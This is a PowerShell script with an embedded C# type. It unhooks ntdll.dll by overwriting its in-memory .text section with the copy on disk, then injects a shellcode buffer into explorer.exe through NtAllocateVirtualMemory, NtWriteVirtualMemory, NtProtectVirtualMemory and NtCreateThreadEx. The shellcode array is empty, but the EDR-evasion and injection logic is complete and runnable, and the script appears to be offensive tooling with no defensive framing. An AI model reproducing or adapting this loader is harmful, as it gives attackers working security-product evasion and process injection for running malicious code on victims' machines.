if (-not ([System.Management.Automation.PSTypeName]'Syscalls').Type) {
    Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class Syscalls
{
    // kernel32.dll functions for finding ntdll function addresses
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // Delegate definitions for our ntdll functions
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        IntPtr Buffer,
        uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtProtectVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        uint NewProtect,
        out uint OldProtect
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateThreadEx(
        out IntPtr threadHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        uint stackZeroBits,
        uint sizeOfStackCommit,
        uint sizeOfStackReserve,
        IntPtr bytesBuffer
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtFreeVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        uint FreeType
    );

    // Helper method to get a delegate for a ntdll function
    public static T GetDelegate<T>(string funcName) where T : class
    {
        IntPtr hModule = GetModuleHandle("ntdll.dll");
        IntPtr procAddress = GetProcAddress(hModule, funcName);
        if (procAddress == IntPtr.Zero) {
            throw new Exception("Failed to get address for " + funcName + ". Error: " + Marshal.GetLastWin32Error());
        }
        return Marshal.GetDelegateForFunctionPointer(procAddress, typeof(T)) as T;
    }
}

// Keep the original Win32 class for constants and the remaining functions
public class Win32
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    // Constants
    public const uint PROCESS_ALL_ACCESS      = 0x1F0FFF;
    public const uint MEM_COMMIT              = 0x1000;
    public const uint MEM_RESERVE             = 0x2000;
    public const uint MEM_RELEASE             = 0x8000;
    public const uint PAGE_READWRITE          = 0x04;
    public const uint PAGE_EXECUTE_READ       = 0x20;
    public const uint PAGE_EXECUTE_READWRITE  = 0x40;
    public const uint INFINITE                = 0xFFFFFFFF;
    public const uint STATUS_SUCCESS          = 0x0;
}
"@
}

function Unhook-Ntdll {
    Write-Host "[*] Starting ntdll unhooking process..."

    # Get handle to ntdll in the current process
    $ntdllHandle = [Syscalls]::GetModuleHandle("ntdll.dll")
    if ($ntdllHandle -eq [IntPtr]::Zero) {
        Write-Warning "Failed to get a handle to the loaded ntdll.dll. Aborting unhook."
        return
    }
    Write-Host "[+] Found loaded ntdll.dll at address: 0x$($ntdllHandle.ToString('X'))"

    # Read clean ntdll from disk
    $ntdllPath = "C:\Windows\System32\ntdll.dll"
    if (-not (Test-Path $ntdllPath)) {
        Write-Warning "Clean ntdll.dll not found at $ntdllPath. Aborting unhook."
        return
    }
    $cleanNtdllBytes = [System.IO.File]::ReadAllBytes($ntdllPath)
    Write-Host "[+] Read $($cleanNtdllBytes.Length) bytes from clean ntdll.dll on disk."

    # --- PE Header Parsing ---
    # Find PE header offset (e_lfanew)
    $e_lfanew = [System.BitConverter]::ToInt32($cleanNtdllBytes, 0x3C)

    # Find NumberOfSections
    $numberOfSections = [System.BitConverter]::ToInt16($cleanNtdllBytes, $e_lfanew + 6)

    # Find SizeOfOptionalHeader
    $sizeOfOptionalHeader = [System.BitConverter]::ToInt16($cleanNtdllBytes, $e_lfanew + 20)

    # Find start of section table
    $sectionTableOffset = $e_lfanew + 24 + $sizeOfOptionalHeader

    # Iterate through sections to find .text section
    $textSectionOffset = 0
    $textSize = 0
    $textVirtualAddress = 0
    for ($i = 0; $i -lt $numberOfSections; $i++) {
        $sectionOffset = $sectionTableOffset + ($i * 40)
        $sectionNameBytes = $cleanNtdllBytes[$sectionOffset..($sectionOffset+7)]
        $sectionName = ([System.Text.Encoding]::ASCII.GetString($sectionNameBytes)).TrimEnd(0)

        if ($sectionName -eq ".text") {
            $textVirtualAddress = [System.BitConverter]::ToInt32($cleanNtdllBytes, $sectionOffset + 12)
            $textSize = [System.BitConverter]::ToInt32($cleanNtdllBytes, $sectionOffset + 16)
            $textSectionOffset = [System.BitConverter]::ToInt32($cleanNtdllBytes, $sectionOffset + 20)
            Write-Host "[+] Found .text section:"
            Write-Host "    - Virtual Address (RVA): 0x$($textVirtualAddress.ToString('X'))"
            Write-Host "    - Size: $textSize bytes"
            Write-Host "    - File Offset: 0x$($textSectionOffset.ToString('X'))"
            break
        }
    }

    if ($textSize -eq 0) {
        Write-Warning "Could not find .text section in ntdll.dll. Aborting unhook."
        return
    }

    $textAddressInMemory = [IntPtr]::Add($ntdllHandle, $textVirtualAddress)
    Write-Host "[+] Calculated in-memory .text section address: 0x$($textAddressInMemory.ToString('X'))"

    $sizeAsUIntPtr = New-Object -TypeName System.UIntPtr -ArgumentList ([uint32]$textSize)

    $oldProtect = 0
    $success = [Win32]::VirtualProtect($textAddressInMemory, $sizeAsUIntPtr, [Win32]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
    if (-not $success) {
        Write-Warning "Failed to change memory protection of .text section. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }
    Write-Host "[+] Changed memory protection of .text section to RWX."

    Write-Host "[*] Copying clean .text section into memory..."
    [System.Runtime.InteropServices.Marshal]::Copy($cleanNtdllBytes, $textSectionOffset, $textAddressInMemory, $textSize)
    Write-Host "[+] Overwrote .text section with clean version from disk."

    $newOldProtect = 0
    $success = [Win32]::VirtualProtect($textAddressInMemory, $sizeAsUIntPtr, $oldProtect, [ref]$newOldProtect)
    if (-not $success) {
        Write-Warning "Failed to restore original memory protection of .text section. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    } else {
        Write-Host "[+] Restored original memory protection."
    }

    Write-Host "[+] NTDLL unhooking process complete."
}

$targetProcessName = "explorer"
$shellcode = [byte[]]()

$syscalls_type = [Syscalls]
$get_delegate_method_info = $syscalls_type.GetMethod("GetDelegate", [System.Reflection.BindingFlags]'Static, Public')

$nt_alloc_delegate_type = [Syscalls+NtAllocateVirtualMemory]
$generic_get_delegate_alloc = $get_delegate_method_info.MakeGenericMethod($nt_alloc_delegate_type)
$NtAllocateVirtualMemory = $generic_get_delegate_alloc.Invoke($null, @("NtAllocateVirtualMemory"))

$nt_write_delegate_type = [Syscalls+NtWriteVirtualMemory]
$generic_get_delegate_write = $get_delegate_method_info.MakeGenericMethod($nt_write_delegate_type)
$NtWriteVirtualMemory = $generic_get_delegate_write.Invoke($null, @("NtWriteVirtualMemory"))

$nt_protect_delegate_type = [Syscalls+NtProtectVirtualMemory]
$generic_get_delegate_protect = $get_delegate_method_info.MakeGenericMethod($nt_protect_delegate_type)
$NtProtectVirtualMemory = $generic_get_delegate_protect.Invoke($null, @("NtProtectVirtualMemory"))

$nt_create_thread_delegate_type = [Syscalls+NtCreateThreadEx]
$generic_get_delegate_create_thread = $get_delegate_method_info.MakeGenericMethod($nt_create_thread_delegate_type)
$NtCreateThreadEx = $generic_get_delegate_create_thread.Invoke($null, @("NtCreateThreadEx"))

$nt_free_delegate_type = [Syscalls+NtFreeVirtualMemory]
$generic_get_delegate_free = $get_delegate_method_info.MakeGenericMethod($nt_free_delegate_type)
$NtFreeVirtualMemory = $generic_get_delegate_free.Invoke($null, @("NtFreeVirtualMemory"))

$hProcess = [IntPtr]::Zero
$hThread = [IntPtr]::Zero
$baseAddress = [IntPtr]::Zero

try {
    Unhook-Ntdll

    $targetProcess = Get-Process -Name $targetProcessName -ErrorAction Stop | Select-Object -First 1
    Write-Host "[+] Found target process: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))"

    $hProcess = [Win32]::OpenProcess([Win32]::PROCESS_ALL_ACCESS, $false, $targetProcess.Id)
    if ($hProcess -eq [IntPtr]::Zero) {
        throw "Failed to open process. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
    Write-Host "[+] Obtained handle to process: 0x$($hProcess.ToString('X'))"

    $regionSize = [IntPtr]$shellcode.Length
    $status = $NtAllocateVirtualMemory.Invoke($hProcess, [ref]$baseAddress, [IntPtr]::Zero, [ref]$regionSize, ([Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE), [Win32]::PAGE_READWRITE)
    if ($status -ne [Win32]::STATUS_SUCCESS) {
        throw "Syscall NtAllocateVirtualMemory failed with status: 0x$($status.ToString('X'))"
    }
    Write-Host "[+] Allocated $($shellcode.Length) bytes of memory at address: 0x$($baseAddress.ToString('X'))"

    $shellcodeHandle = [System.Runtime.InteropServices.GCHandle]::Alloc($shellcode, "Pinned")
    $shellcodePtr = $shellcodeHandle.AddrOfPinnedObject()
    $bytesWritten = 0
    $status = $NtWriteVirtualMemory.Invoke($hProcess, $baseAddress, $shellcodePtr, $shellcode.Length, [ref]$bytesWritten)
    $shellcodeHandle.Free()
    if ($status -ne [Win32]::STATUS_SUCCESS) {
        throw "Syscall NtWriteVirtualMemory failed with status: 0x$($status.ToString('X'))"
    }
    Write-Host "[+] Wrote $bytesWritten bytes to remote process."

    $oldProtect = 0
    $protectSize = [IntPtr]$shellcode.Length
    $status = $NtProtectVirtualMemory.Invoke($hProcess, [ref]$baseAddress, [ref]$protectSize, [Win32]::PAGE_EXECUTE_READ, [ref]$oldProtect)
    if ($status -ne [Win32]::STATUS_SUCCESS) {
        throw "Syscall NtProtectVirtualMemory failed with status: 0x$($status.ToString('X'))"
    }
    Write-Host "[+] Changed memory protection to PAGE_EXECUTE_READ."

    $status = $NtCreateThreadEx.Invoke([ref]$hThread, [Win32]::PROCESS_ALL_ACCESS, [IntPtr]::Zero, $hProcess, $baseAddress, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
    if ($status -ne [Win32]::STATUS_SUCCESS) {
        throw "Syscall NtCreateThreadEx failed with status: 0x$($status.ToString('X'))"
    }
    Write-Host "[+] Created remote thread with handle: 0x$($hThread.ToString('X'))"

    Write-Host "[*] Waiting for thread to complete..."
    [Win32]::WaitForSingleObject($hThread, [Win32]::INFINITE) | Out-Null
    Write-Host "[+] Thread execution finished."

} catch {
    Write-Error "An error occurred: $($_.Exception.Message)"
} finally {
    if ($hThread -ne [IntPtr]::Zero) {
        Write-Host "[*] Closing thread handle."
        [Win32]::CloseHandle($hThread)
    }
    if ($baseAddress -ne [IntPtr]::Zero -and $hProcess -ne [IntPtr]::Zero) {
        Write-Host "[*] Freeing allocated memory."
        $regionSize = [IntPtr]0
        $status = $NtFreeVirtualMemory.Invoke($hProcess, [ref]$baseAddress, [ref]$regionSize, [Win32]::MEM_RELEASE)
        if ($status -ne [Win32]::STATUS_SUCCESS) {
            Write-Warning "Syscall NtFreeVirtualMemory failed with status: 0x$($status.ToString('X'))"
        }
    }
    if ($hProcess -ne [IntPtr]::Zero) {
        Write-Host "[*] Closing process handle."
        [Win32]::CloseHandle($hProcess)
    }
    Write-Host "[+] Cleanup complete. Script finished."
}